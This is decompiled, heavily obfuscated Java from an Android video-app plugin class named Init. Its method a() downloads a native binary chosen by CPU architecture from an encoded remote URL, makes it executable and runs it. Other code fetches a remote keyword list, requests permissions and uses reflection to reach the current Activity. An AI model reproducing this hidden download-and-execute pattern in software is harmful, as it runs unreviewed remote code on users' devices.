package com.github.catvod.spider;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Base64;
import com.github.catvod.crawler.SpiderDebug;
import com.github.catvod.spider.merge.a.C0098a;
import com.github.catvod.spider.merge.n.C0197c;
import com.github.catvod.spider.merge.o.e;
import com.github.catvod.spider.merge.o.f;
import com.github.catvod.spider.merge.oZP;
import com.github.catvod.spider.merge.p.C0207D;
import com.github.catvod.spider.merge.p.C0213f;
import com.github.catvod.spider.merge.p.C0220m;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import okhttp3.Response;
import org.json.JSONObject;

/* JADX INFO: loaded from: /tmp/decompiler/446907477a41490d9e71cfdd71d695e7/classes.dex */
public class Init {
    private Application c;
    private static final String e = C0098a.a(new byte[]{38, -2, 43, -49, -51, 122, 91, -16, 40, -7, 114, -42, -45, 109, 31, -70, 40, -1, 113, -120, -45, 47, 27, -83, 99, -20, 44, -114, -112, 35, 27, -78, 97, -26, 38, -112, -118, 36, 70, -68, 125, -20, 111, -113, -109, 119, 16, -21, 45, -89, 110, -114, -37, 117, 89, -66, 40, -69, 106, -110, -118, 113, 22, -71, 120, -71, 62, -38, -118, 37, 21, -17, 97, -69, 104, -117, -118, 114, 67, -26, 122, -68, 110, -119, -116, 121, 91, -81, 39, -28, 56, -35, -41, 35, 29, -15, 58, -14, 43}, new byte[]{78, -118, 95, -65, -66, 64, 116, -33});
    private static final String f = C0098a.a(new byte[]{6, -21, -35, -5, -62, 40, -86, -82, 9, -10, -35, -18, -44, 60, -26, -18, 3, -80, -13, -22, -46, 122, -33, -7, 49, -2, -51, -26, -40, 124, -86, -20, 11, -5, -64, -22, -98, 96, -28, -10, 65, -14, -56, -8, -59, 119, -9, -82, 3, -10, -50, -28, -63, 96, -22, -7, 23, -23, -101, -91, -59, 106, -15}, new byte[]{110, -97, -87, -117, -79, 18, -123, -127});
    public static String d = "";
    private static final Map<String, Boolean> g = new HashMap();
    private final Handler b = new Handler(Looper.getMainLooper());
    private final ExecutorService a = Executors.newFixedThreadPool(5);

    class Loader {
        static final Init a = new Init();

        private Loader() {
        }
    }

    public static void a() {
        try {
            String strL = C0197c.l(f, null);
            if (TextUtils.isEmpty(strL)) {
                return;
            }
            JSONObject jSONObject = new JSONObject(new String(Base64.decode(strL, 0)));
            String[] strArr = new String[0];
            if (Build.VERSION.SDK_INT >= 21) {
                strArr = Build.SUPPORTED_ABIS;
            }
            String string = Arrays.toString(strArr);
            d = string.contains(C0098a.a(new byte[]{-128, 8, 87}, new byte[]{-8, 48, 97, 4, 65, 98, -108, -116})) ? C0098a.a(new byte[]{43, 55, 36, -10, -116, 87, -27, 67, 45, 54, 48, -10, -116, 70, -8, 67, 45, 53, 48, -78, -41}, new byte[]{76, 88, 84, -124, -29, 47, -100, 110}) : string.contains(C0098a.a(new byte[]{-64, -76, -94, 67, 29}, new byte[]{-95, -58, -49, 117, 41, 52, 118, 48})) ? C0098a.a(new byte[]{-64, -43, -17, -55, 42, -12, -86, -37, -58, -44, -5, -55, 42, -27, -73, -37, -58, -56, -14, -115, 113}, new byte[]{-89, -70, -97, -69, 69, -116, -45, -10}) : C0098a.a(new byte[]{-21, -88, 30, 85, 59, 39, 59, -18, -19, -87, 10, 85, 59, 54, 38, -18, -19, -75, 3}, new byte[]{-116, -57, 110, 39, 84, 95, 66, -61});
            File file = new File(context().getFilesDir().getAbsolutePath() + C0098a.a(new byte[]{103}, new byte[]{72, 7, 17, -94, 84, 71, -126, -18}) + d);
            String string2 = jSONObject.getString(d);
            String string3 = jSONObject.getString(d + C0098a.a(new byte[]{-58, -93, 58, 91}, new byte[]{-24, -50, 94, 110, 61, 106, -90, -24}));
            if (!file.exists() || !string3.equals(calculateMD5(file))) {
                InputStream inputStreamI = i(string2);
                write(file, inputStreamI);
                file.setExecutable(true);
            }
            C0213f.a(C0098a.a(new byte[]{-105, -45, -59, -81, -66, -38, 49, -117, -63, -101}, new byte[]{-12, -69, -88, -64, -38, -6, 6, -66}) + file);
            C0213f.a(C0098a.a(new byte[]{-11, -54, -28, 27, 73, -34, 55, 2, -77, -102, -88}, new byte[]{-98, -93, -120, 119, 40, -78, 91, 34}) + d);
            Thread.sleep(100L);
            C0213f.b(file.toString());
        } catch (Exception e2) {
            e2.printStackTrace();
            SpiderDebug.log(C0098a.a(new byte[]{-16, -125, 61, 121, -126, -75, 108, -39, -15, -104, 36, 114, -42, -105, 113, -5}, new byte[]{-125, -9, 92, 11, -10, -14, 3, -119}) + e2.getMessage());
        }
    }

    /* JADX WARN: Type inference failed for: r2v1, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.Boolean>] */
    public static /* synthetic */ void b() {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(e).openStream()));
            while (true) {
                try {
                    String line = bufferedReader.readLine();
                    if (line == null) {
                        bufferedReader.close();
                        return;
                    }
                    g.put(line, Boolean.TRUE);
                } catch (Throwable th) {
                    try {
                        bufferedReader.close();
                    } catch (Throwable unused) {
                    }
                    throw th;
                }
            }
        } catch (IOException e2) {
            e2.printStackTrace();
        }
    }

    public static String calculateMD5(File file) {
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            try {
                MessageDigest messageDigest = MessageDigest.getInstance(C0098a.a(new byte[]{-42, 74, 57}, new byte[]{-101, 14, 12, -7, 29, -29, -65, 92}));
                byte[] bArr = new byte[8192];
                while (true) {
                    int i = fileInputStream.read(bArr);
                    if (i == -1) {
                        break;
                    }
                    messageDigest.update(bArr, 0, i);
                }
                StringBuilder sb = new StringBuilder();
                for (byte b : messageDigest.digest()) {
                    sb.append(String.format(C0098a.a(new byte[]{-117, 127, 114, 71}, new byte[]{-82, 79, 64, 63, 127, -100, -108, 89}), Byte.valueOf(b)));
                }
                String string = sb.toString();
                fileInputStream.close();
                return string;
            } catch (Throwable th) {
                try {
                    fileInputStream.close();
                } catch (Throwable unused) {
                }
                throw th;
            }
        } catch (Exception e2) {
            e2.printStackTrace();
            return null;
        }
    }

    public static void checkPermission() {
        try {
            Activity activity = getActivity();
            if (activity != null && Build.VERSION.SDK_INT >= 23) {
                activity.requestPermissions(new String[]{C0098a.a(new byte[]{110, 39, -55, -36, 70, -22, -19, 103, 127, 44, -33, -61, 64, -16, -6, 32, 96, 39, -125, -7, 123, -54, -35, 12, 80, 12, -11, -6, 108, -47, -57, 8, 67, 22, -2, -6, 102, -47, -56, 14, 74}, new byte[]{15, 73, -83, -82, 41, -125, -119, 73}), C0098a.a(new byte[]{-33, -108, -75, -111, 93, -75, -21, -4, -50, -97, -93, -114, 91, -81, -4, -69, -47, -108, -1, -94, 113, -97, -54, -127, -19, -91, -122, -86, 116, -107, -48, -127, -22, -69, -123, -90}, new byte[]{-66, -6, -47, -29, 50, -36, -113, -46})}, 9999);
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static Application context() {
        return get().c;
    }

    public static void e(InputStream inputStream, String str) throws IOException {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
        while (true) {
            String line = bufferedReader.readLine();
            if (line == null) {
                return;
            }
            SpiderDebug.log(str + oZP.d("554F") + line);
        }
    }

    public static void execute(Runnable runnable) {
        get().a.execute(runnable);
    }

    public static Init get() {
        return Loader.a;
    }

    public static Activity getActivity() throws IllegalAccessException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException {
        Class<?> cls = Class.forName(C0098a.a(new byte[]{71, -51, 93, 110, -103, 110, -70, -19, 71, -45, 73, 50, -73, 100, -86, -86, 80, -54, 77, 101, -94, 111, -84, -90, 71, -57}, new byte[]{38, -93, 57, 28, -10, 7, -34, -61}));
        Object objInvoke = cls.getMethod(C0098a.a(new byte[]{2, 98, 106, -14, 68, 29, -81, 73, 2, 99, 113, -10, 72, 7, -94, 92, 9, 101, 125, -31, 69}, new byte[]{97, 23, 24, -128, 33, 115, -37, 8}), new Class[0]).invoke(null, new Object[0]);
        Field declaredField = cls.getDeclaredField(C0098a.a(new byte[]{-117, -67, -62, -51, -72, -126, 17, -50, -113, -103, -46}, new byte[]{-26, -4, -95, -71, -47, -12, 120, -70}));
        declaredField.setAccessible(true);
        for (Object obj : ((Map) declaredField.get(objInvoke)).values()) {
            Class<?> cls2 = obj.getClass();
            Field declaredField2 = cls2.getDeclaredField(C0098a.a(new byte[]{-72, 40, -123, -48, 86, -68}, new byte[]{-56, 73, -16, -93, 51, -40, -38, 96}));
            declaredField2.setAccessible(true);
            if (!declaredField2.getBoolean(obj)) {
                Field declaredField3 = cls2.getDeclaredField(C0098a.a(new byte[]{-12, 92, 5, -65, 58, 21, -38, 101}, new byte[]{-107, 63, 113, -42, 76, 124, -82, 28}));
                declaredField3.setAccessible(true);
                return (Activity) declaredField3.get(obj);
            }
        }
        return null;
    }

    public static Map<String, Boolean> getKeywordsMap() {
        return g;
    }

    public static InputStream i(String str) {
        Response responseD;
        int iCode;
        try {
            responseD = C0197c.d(str);
            iCode = responseD.code();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        if (iCode == 200) {
            return responseD.body().byteStream();
        }
        SpiderDebug.log(C0098a.a(new byte[]{90, 77, 105, 73, 61, -119, 96, -40, 115, 12, 100, 74, 47, -125, 44, -61, 125, 72, 32, 67, 49, -127, 37, -126, 60, 127, 101, 87, 46, -120, 50, -1, 104, 77, 114, 81, 120, -97, 37, -40, 105, 94, 110, 64, 60, -51, 8, -8, 72, 124, 32, 87, 61, -98, 48, -61, 114, 95, 101, 5, 59, -126, 36, -55, 38, 12}, new byte[]{28, 44, 0, 37, 88, -19, 64, -84}) + iCode);
        return null;
    }

    public static void init(Context context) {
        String strC;
        get().c = (Application) context;
        SpiderDebug.log(C0098a.a(new byte[]{104, 0, 80, 26, -87, -109, -66, -90, 9, 96, 114, 83, -17, -112, -15, -5, 59, 36, 29, 95, -122, -31, -25, -94, 101, 2, 95, 25, -113, -103, -65, -107, 31, 104, 70, 126}, new byte[]{-128, -121, -6, -1, 7, 9, 90, 31}));
        startGoProxy(get().c);
        Pattern pattern = C0207D.a;
        try {
            ClassLoader classLoader = C0207D.class.getClassLoader();
            Field declaredField = Class.forName(C0098a.a(new byte[]{83, -72, -89, 94, -13, -107, -63, 80, 78, -86, -65, 77, -9, -48, -83, 66, 68, -68, -113, 77, -30, -67, -125, 66, 68, -86, -121, 71, -5, -102, -118, 81}, new byte[]{55, -39, -53, 40, -102, -2, -17, 35})).getDeclaredField(C0098a.a(new byte[]{16, 65, -127, -97, 96, -107, 68, -52}, new byte[]{96, 32, -11, -9, 44, -4, 55, -72}));
            declaredField.setAccessible(true);
            Matcher matcher = Pattern.compile(C0098a.a(new byte[]{-124, -87, 13, 43, -29, -4, -69, 79, -34, -30, 85, 80, -37, -73, -118, 1, -41, -30}, new byte[]{-2, -64, 125, 11, -123, -107, -41, 42})).matcher(declaredField.get(classLoader).toString());
            if (matcher.find()) {
                File file = new File(matcher.group(1));
                if (!file.exists() || !file.isFile() || (strC = C0207D.c(file)) == null || strC.isEmpty()) {
                    return;
                }
                C0220m.d(C0098a.a(new byte[]{6, 59, -48, 86, 102, -48}, new byte[]{108, 90, -94, 59, 2, -27, -64, 4}), strC);
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static void initKeywordsMap() {
        new Thread(f.d).start();
    }

    public static void run(Runnable runnable) {
        get().b.post(runnable);
    }

    public static void run(Runnable runnable, int i) {
        get().b.postDelayed(runnable, i);
    }

    public static void startGoProxy(Context context) {
        if (context.getApplicationContext().getApplicationInfo().targetSdkVersion < 29) {
            new Thread(e.d).start();
        }
    }

    public static void write(File file, InputStream inputStream) throws IOException {
        if (file.exists()) {
            file.delete();
        }
        file.createNewFile();
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        byte[] bArr = new byte[65536];
        while (true) {
            int i = inputStream.read(bArr);
            if (i <= 0) {
                fileOutputStream.close();
                inputStream.close();
                return;
            }
            fileOutputStream.write(bArr, 0, i);
        }
    }
}
